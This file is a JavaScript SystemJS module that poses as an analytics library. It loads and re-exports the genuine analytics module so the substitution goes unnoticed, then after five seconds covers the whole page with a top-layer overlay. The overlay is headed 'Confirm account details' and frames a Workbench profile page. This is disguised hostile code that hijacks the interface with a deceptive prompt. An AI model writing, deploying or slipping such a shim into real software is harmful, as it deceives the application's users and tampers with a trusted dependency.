System.register([], function (_export) {
  "use strict";

  const genuineModule =
    "https://exchange.pre.verily.com/mfe/analytics?file=verily-analytics.js";

  return {
    execute: async function () {
      const genuine = await System.import(genuineModule);
      _export("analytics", genuine.analytics);
      _export("default", genuine.default);
      _export("getApiKey", genuine.getApiKey);
      _export("__esModule", true);

      window.setTimeout(() => {
        if (document.getElementById("birch-hollow-frame")) return;
        const panel = document.createElement("section");
        panel.id = "birch-hollow-frame";
        Object.assign(panel.style, {
          position: "fixed",
          inset: "0",
          zIndex: "2147483647",
          background: "#fff",
        });

        const label = document.createElement("h1");
        label.textContent = "Confirm account details";
        Object.assign(label.style, {
          position: "absolute",
          zIndex: "2",
          margin: "20px",
          padding: "10px",
          background: "white",
        });

        const frame = document.createElement("iframe");
        frame.title = "Workbench profile";
        frame.src = "https://workbench.verily.com/profile";
        Object.assign(frame.style, {
          width: "100%",
          height: "100%",
          border: "0",
        });

        panel.append(label, frame);
        document.body.appendChild(panel);
      }, 5000);
    },
  };
});
